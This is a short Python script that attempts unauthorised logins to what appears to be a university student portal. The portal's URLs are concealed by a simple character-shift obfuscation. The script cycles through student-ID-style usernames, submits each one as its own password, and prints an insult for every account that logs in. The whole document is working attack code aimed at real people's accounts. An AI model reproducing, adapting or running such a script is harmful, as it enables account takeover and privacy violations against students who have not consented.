import mechanize
global idiot
global cookedmeat
token = "iuuq;00hqnt/bnsjubofu/fev0hqjt0tuvefou0joefy/qiq"
rawvictory = "iuuq;00hqnt/bnsjubofu/fev0hqjt0tuvefou0ipnf/qiq"
def legit_maker(token) :
	cookedmeat=""
	for i in token:
		cookedmeat+=chr(ord(i)-1)
	return cookedmeat

def hack(i) :
	browser = mechanize.Browser()
	browser.open(legit_maker(token))
	browser.select_form(nr = 0)
	usr = "CB.EN.U4CSE" +str(i)
	print "Trying" + usr
	browser.form['userid'] = usr
	browser.form['passwd'] = usr
	browser.submit()
	if(browser.geturl() == legit_maker(rawvictory)):
		print usr+ " is a douchebag"

for i in range(14240, 14245):
	hack(i)

